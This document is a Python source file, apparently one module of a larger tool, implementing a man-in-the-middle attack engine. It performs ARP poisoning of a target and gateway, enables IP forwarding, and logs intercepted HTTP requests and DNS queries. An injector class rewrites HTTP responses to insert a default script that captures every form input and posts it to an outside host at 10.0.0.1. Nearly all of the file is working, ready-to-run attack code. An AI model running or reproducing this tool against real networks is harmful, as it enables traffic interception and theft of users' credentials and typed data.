"""
Man-in-the-Middle Attack Engine
───────────────────────────────
Performs MITM attacks to intercept and modify traffic between clients
and the internet. Supports ARP poisoning, DNS spoofing, and traffic injection.

Features:
  - ARP cache poisoning on local network
  - IP forwarding enablement/restoration
  - HTTP request/response modification
  - Payload injection into TCP streams
"""

import time
import threading
import subprocess
from collections import defaultdict

from scapy.all import ARP, IP, TCP, UDP, Raw, sniff, sendp, send, get_if_hwaddr, conf, srp
from scapy.layers.inet import Ether
from scapy.layers.dns import DNS, DNSQR, DNSRR

from .config import NETWORK_GW_IP, NETWORK_MASK, IS_WINDOWS, IS_LINUX, log


class MITMEngine:
    """
    Man-in-the-middle attack engine using ARP poisoning.
    Redirects traffic through attacker machine for inspection/modification.
    """

    def __init__(self, interface, target_ip=None, gateway_ip=None):
        self.interface = interface
        self.target_ip = target_ip
        self.gateway_ip = gateway_ip or "192.168.1.1"
        self.attacker_mac = get_if_hwaddr(interface)
        self.running = False
        self._poison_threads = []
        self._packet_handler_thread = None
        self._target_mac = None
        self._gateway_mac = None
        self._arp_cache = {}
        self._http_requests = []
        self._dns_queries = []
        self._original_ip_forward = None

    def _enable_ip_forwarding(self):
        """
        Enable IP forwarding so traffic flows through the attacker machine.
        Saves the original state to restore later.
        """
        if IS_LINUX:
            try:
                with open("/proc/sys/net/ipv4/ip_forward", "r") as f:
                    self._original_ip_forward = f.read().strip()
                with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
                    f.write("1")
                log.info("IP forwarding enabled (Linux)")
            except (IOError, PermissionError) as e:
                log.warning(f"Could not enable IP forwarding via proc: {e}")
                try:
                    result = subprocess.run(
                        ["sysctl", "-w", "net.ipv4.ip_forward=1"],
                        capture_output=True, text=True, timeout=5
                    )
                    if result.returncode == 0:
                        log.info("IP forwarding enabled via sysctl")
                    else:
                        log.error(f"sysctl failed: {result.stderr}")
                except Exception as ex:
                    log.error(f"Failed to enable IP forwarding: {ex}")
        elif IS_WINDOWS:
            try:
                # Read current value from registry
                result = subprocess.run(
                    ["reg", "query",
                     r"HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters",
                     "/v", "IPEnableRouter"],
                    capture_output=True, text=True, timeout=10
                )
                if "0x0" in result.stdout:
                    self._original_ip_forward = "0"
                else:
                    self._original_ip_forward = "1"

                # Enable via registry
                subprocess.run(
                    ["reg", "add",
                     r"HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters",
                     "/v", "IPEnableRouter", "/t", "REG_DWORD", "/d", "1", "/f"],
                    capture_output=True, text=True, timeout=10
                )
                # Also enable via netsh for immediate effect
                subprocess.run(
                    ["netsh", "interface", "ipv4", "set", "interface",
                     self.interface, "forwarding=enabled"],
                    capture_output=True, text=True, timeout=10
                )
                log.info("IP forwarding enabled (Windows)")
            except Exception as e:
                log.error(f"Failed to enable IP forwarding on Windows: {e}")
        else:
            log.warning("Unknown platform - cannot enable IP forwarding")

    def _disable_ip_forwarding(self):
        """
        Restore IP forwarding to its original state.
        """
        if self._original_ip_forward is None:
            return

        if IS_LINUX:
            try:
                with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
                    f.write(self._original_ip_forward)
                log.info(f"IP forwarding restored to {self._original_ip_forward}")
            except (IOError, PermissionError) as e:
                log.warning(f"Could not restore IP forwarding via proc: {e}")
                try:
                    subprocess.run(
                        ["sysctl", "-w",
                         f"net.ipv4.ip_forward={self._original_ip_forward}"],
                        capture_output=True, text=True, timeout=5
                    )
                except Exception as ex:
                    log.error(f"Failed to restore IP forwarding: {ex}")
        elif IS_WINDOWS:
            try:
                subprocess.run(
                    ["reg", "add",
                     r"HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters",
                     "/v", "IPEnableRouter", "/t", "REG_DWORD",
                     "/d", self._original_ip_forward, "/f"],
                    capture_output=True, text=True, timeout=10
                )
                if self._original_ip_forward == "0":
                    subprocess.run(
                        ["netsh", "interface", "ipv4", "set", "interface",
                         self.interface, "forwarding=disabled"],
                        capture_output=True, text=True, timeout=10
                    )
                log.info("IP forwarding restored (Windows)")
            except Exception as e:
                log.error(f"Failed to restore IP forwarding on Windows: {e}")

        self._original_ip_forward = None

    def _get_mac(self, ip):
        """Get MAC address for IP using ARP."""
        if ip in self._arp_cache:
            return self._arp_cache[ip]

        ans, _ = srp(
            Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
            timeout=2, verbose=False, iface=self.interface
        )

        for _, r in ans:
            self._arp_cache[ip] = r[ARP].hwsrc
            return r[ARP].hwsrc
        return None

    def _arp_poison_target(self, target_ip, target_mac, gateway_ip):
        """Poison target's ARP cache to think attacker is gateway."""
        while self.running:
            sendp(
                Ether(dst=target_mac) / ARP(
                    op=2, psrc=gateway_ip, pdst=target_ip, hwsrc=self.attacker_mac
                ),
                verbose=False, iface=self.interface
            )
            time.sleep(2)

    def _arp_poison_gateway(self, gateway_ip, gateway_mac, target_ip):
        """Poison gateway's ARP cache to think attacker is target."""
        while self.running:
            sendp(
                Ether(dst=gateway_mac) / ARP(
                    op=2, psrc=target_ip, pdst=gateway_ip, hwsrc=self.attacker_mac
                ),
                verbose=False, iface=self.interface
            )
            time.sleep(2)

    def start(self, target_ip=None, gateway_ip=None):
        """Start MITM attack with IP forwarding and ARP poisoning."""
        if IS_WINDOWS:
            log.warning("MITM via ARP poisoning has limited support on Windows.")
            log.warning("Raw socket operations may require Npcap with WinPcap compatibility mode.")

        self.running = True
        self.target_ip = target_ip or self.target_ip
        self.gateway_ip = gateway_ip or self.gateway_ip

        if not self.target_ip:
            log.error("No target IP specified")
            return False

        # Enable IP forwarding so intercepted traffic gets routed
        self._enable_ip_forwarding()

        # Get MAC addresses
        log.info(f"Resolving MAC addresses for {self.target_ip} and {self.gateway_ip}...")
        self._target_mac = self._get_mac(self.target_ip)
        self._gateway_mac = self._get_mac(self.gateway_ip)

        if not self._target_mac:
            log.error(f"Could not resolve target MAC for {self.target_ip}")
            self._disable_ip_forwarding()
            return False
        if not self._gateway_mac:
            log.error(f"Could not resolve gateway MAC for {self.gateway_ip}")
            self._disable_ip_forwarding()
            return False

        log.info(f"Target: {self.target_ip} ({self._target_mac})")
        log.info(f"Gateway: {self.gateway_ip} ({self._gateway_mac})")

        # Start ARP poisoning threads
        self._poison_threads = [
            threading.Thread(
                target=self._arp_poison_target,
                args=(self.target_ip, self._target_mac, self.gateway_ip),
                daemon=True
            ),
            threading.Thread(
                target=self._arp_poison_gateway,
                args=(self.gateway_ip, self._gateway_mac, self.target_ip),
                daemon=True
            )
        ]

        for t in self._poison_threads:
            t.start()

        # Start packet sniffing
        self._packet_handler_thread = threading.Thread(
            target=self._sniff_traffic,
            daemon=True
        )
        self._packet_handler_thread.start()

        log.info(f"MITM attack active: {self.target_ip} <-> {self.attacker_mac} <-> {self.gateway_ip}")
        return True

    def _sniff_traffic(self):
        """Sniff and process intercepted traffic."""
        def packet_handler(pkt):
            if not pkt.haslayer(IP):
                return

            ip_layer = pkt[IP]
            src_ip = ip_layer.src
            dst_ip = ip_layer.dst

            # Log HTTP requests
            if pkt.haslayer(TCP) and pkt.haslayer(Raw):
                payload = str(pkt[Raw].load)
                if "GET " in payload or "POST " in payload:
                    self._http_requests.append({
                        "src": src_ip, "dst": dst_ip, "payload": payload,
                        "timestamp": time.time()
                    })
                    log.info(f"HTTP: {src_ip} -> {dst_ip}")

            # Log DNS queries
            if pkt.haslayer(DNS) and pkt[DNS].qd:
                qname = pkt[DNS].qd.qname.decode()
                self._dns_queries.append({
                    "src": src_ip, "qname": qname, "timestamp": time.time()
                })
                log.info(f"DNS: {src_ip} -> {qname}")

        sniff(
            iface=self.interface,
            prn=packet_handler,
            store=False,
            stop_filter=lambda x: not self.running
        )

    def _restore_arp(self):
        """Send ARP restore packets multiple times to ensure caches are corrected."""
        if not self._target_mac or not self._gateway_mac:
            return

        log.info("Restoring ARP tables (sending 5 restore packets)...")
        for _ in range(5):
            # Restore target: tell target the real gateway MAC
            sendp(
                Ether(dst=self._target_mac) / ARP(
                    op=2, psrc=self.gateway_ip, pdst=self.target_ip,
                    hwsrc=self._gateway_mac, hwdst=self._target_mac
                ),
                verbose=False, iface=self.interface
            )
            # Restore gateway: tell gateway the real target MAC
            sendp(
                Ether(dst=self._gateway_mac) / ARP(
                    op=2, psrc=self.target_ip, pdst=self.gateway_ip,
                    hwsrc=self._target_mac, hwdst=self._gateway_mac
                ),
                verbose=False, iface=self.interface
            )
            time.sleep(0.5)

    def stop(self):
        """Stop MITM attack, restore ARP tables, and disable IP forwarding."""
        self.running = False

        # Restore ARP tables (send multiple times for reliability)
        self._restore_arp()

        # Disable IP forwarding
        self._disable_ip_forwarding()

        # Wait for threads to finish
        for t in self._poison_threads:
            t.join(timeout=3)
        if self._packet_handler_thread:
            self._packet_handler_thread.join(timeout=3)

        log.info("MITM attack stopped, ARP tables restored, IP forwarding disabled")

    def get_http_requests(self):
        """Return captured HTTP requests."""
        return self._http_requests

    def get_dns_queries(self):
        """Return captured DNS queries."""
        return self._dns_queries

    def get_stats(self):
        """Return MITM statistics."""
        return {
            "http_requests": len(self._http_requests),
            "dns_queries": len(self._dns_queries),
            "targets": 1 if self.target_ip else 0,
            "running": self.running
        }


class HTTPInjector(MITMEngine):
    """
    HTTP traffic injector - modifies HTTP responses to inject payloads.
    Intercepts packets in-flight, modifies the HTTP response body,
    recalculates checksums, and re-injects them into the stream.
    """

    def __init__(self, interface, inject_html=None, inject_js=None):
        super().__init__(interface)
        self.inject_html = inject_html
        self.inject_js = inject_js or (
            '<script>'
            'document.addEventListener("input", function(e) {'
            'fetch("http://10.0.0.1/log", {'
            'method: "POST",'
            'body: JSON.stringify({field: e.target.name, value: e.target.value})'
            '});'
            '});'
            '</script>'
        )
        self._injected_count = 0

    def _modify_response(self, pkt):
        """
        Modify HTTP response to inject payload into HTML body.
        Returns the modified packet or None if no modification was needed.
        """
        if not pkt.haslayer(Raw):
            return None

        payload = bytes(pkt[Raw].load)

        # Only modify HTTP 200 OK responses with HTML content
        if b"HTTP/1." not in payload:
            return None
        if b"200 OK" not in payload and b"200 ok" not in payload:
            return None

        # Check if this is HTML content
        headers_end = payload.find(b"\r\n\r\n")
        if headers_end == -1:
            return None

        headers_raw = payload[:headers_end].lower()
        if b"text/html" not in headers_raw:
            return None

        headers = payload[:headers_end]
        body = payload[headers_end + 4:]

        # Determine what to inject
        injection = b""
        if self.inject_js:
            injection = self.inject_js.encode() if isinstance(self.inject_js, str) else self.inject_js
        elif self.inject_html:
            injection = self.inject_html.encode() if isinstance(self.inject_html, str) else self.inject_html

        if not injection:
            return None

        # Inject before </body> or </html> or at end
        if b"</body>" in body:
            body = body.replace(b"</body>", injection + b"</body>", 1)
        elif b"</html>" in body:
            body = body.replace(b"</html>", injection + b"</html>", 1)
        else:
            body += injection

        # Recalculate Content-Length header
        import re as _re
        headers_str = headers.decode(errors="ignore")
        new_headers = _re.sub(
            r'(?i)content-length:\s*\d+',
            f'Content-Length: {len(body)}',
            headers_str
        )

        modified_payload = new_headers.encode() + b"\r\n\r\n" + body
        self._injected_count += 1
        return modified_payload

    def _sniff_traffic(self):
        """
        Override sniff traffic to intercept HTTP responses,
        modify them with injected payloads, and re-inject.
        """
        def packet_handler(pkt):
            if not pkt.haslayer(IP):
                return

            ip_layer = pkt[IP]
            src_ip = ip_layer.src
            dst_ip = ip_layer.dst

            # Log HTTP requests
            if pkt.haslayer(TCP) and pkt.haslayer(Raw):
                raw_payload = str(pkt[Raw].load)
                if "GET " in raw_payload or "POST " in raw_payload:
                    self._http_requests.append({
                        "src": src_ip, "dst": dst_ip,
                        "payload": raw_payload,
                        "timestamp": time.time()
                    })
                    log.info(f"HTTP: {src_ip} -> {dst_ip}")

                # Attempt to modify HTTP responses heading to target
                if pkt[TCP].sport == 80 and dst_ip == self.target_ip:
                    modified_payload = self._modify_response(pkt)
                    if modified_payload is not None:
                        # Build modified packet with recalculated checksums
                        modified_pkt = (
                            IP(src=src_ip, dst=dst_ip) /
                            TCP(
                                sport=pkt[TCP].sport,
                                dport=pkt[TCP].dport,
                                seq=pkt[TCP].seq,
                                ack=pkt[TCP].ack,
                                flags=pkt[TCP].flags
                            ) /
                            Raw(load=modified_payload)
                        )
                        # Delete checksums so scapy recalculates them
                        del modified_pkt[IP].len
                        del modified_pkt[IP].chksum
                        del modified_pkt[TCP].chksum

                        send(modified_pkt, verbose=False, iface=self.interface)
                        log.info(f"Injected payload into response from {src_ip}")

            # Log DNS queries
            if pkt.haslayer(DNS) and pkt[DNS].qd:
                qname = pkt[DNS].qd.qname.decode()
                self._dns_queries.append({
                    "src": src_ip, "qname": qname, "timestamp": time.time()
                })
                log.info(f"DNS: {src_ip} -> {qname}")

        sniff(
            iface=self.interface,
            prn=packet_handler,
            store=False,
            stop_filter=lambda x: not self.running
        )

    def start(self, *args, **kwargs):
        """Start HTTP injector with MITM capabilities."""
        log.info("HTTP Injector started - payloads will be injected into responses")
        return super().start(*args, **kwargs)

    def get_stats(self):
        """Return injector statistics."""
        stats = super().get_stats()
        stats["injected_responses"] = self._injected_count
        return stats
